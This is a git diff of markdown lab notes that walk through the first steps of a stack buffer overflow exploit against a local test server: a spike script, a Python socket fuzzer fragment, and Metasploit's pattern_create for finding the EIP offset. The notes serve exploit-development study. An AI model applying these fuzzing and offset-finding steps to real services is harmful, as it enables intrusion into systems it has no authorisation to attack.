@@ -79,7 +79,7 @@ The process needs to be running on the target machine **Admin**. We need to run 
 We can connect with the running process on the target machine using nc on the host machine. Get the commands allowed to be executed on the running process.
 
 #### Stepone: Spiking
-	It is used to test whether the running process is vulnerable or not. 
+ 	-> It is used to test whether the running process is vulnerable or not. 
 		
 		stats.spk:
 		s_readline();
@@ -89,8 +89,8 @@ We can connect with the running process on the target machine using nc on the ho
 		generic_send_tcp 10.10.2.11 44 stats.spk 0 0
 		
 #### Step Two: Fuzzing:
-		To find the exact bytes where it was breaking
-	``` bash
+	->To find the exact bytes where it was breaking
+	``` 
 		#!/usr/bin/python3
 		import sys, socket
 		from time import sleep
@@ -112,9 +112,9 @@ We can connect with the running process on the target machine using nc on the ho
 	```
 	Step3: finding offset:
 		
-		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l  10500(output from last step, when server crashed)
+	-> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l  10500(output from last step, when server crashed)
 
-		We are able to find the ESP has been overloaded with the values that we have sent and Take the EIP value from the immunity debugger after it was crashed. The output from below will give exact bytes that are required to overwrite.
+	-> We are able to find the ESP has been overloaded with the values that we have sent and Take the EIP value from the immunity debugger after it was crashed. The output from below will give exact bytes that are required to overwrite.
 	```
 	#!/usr/bin/python3
 	import sys, socket
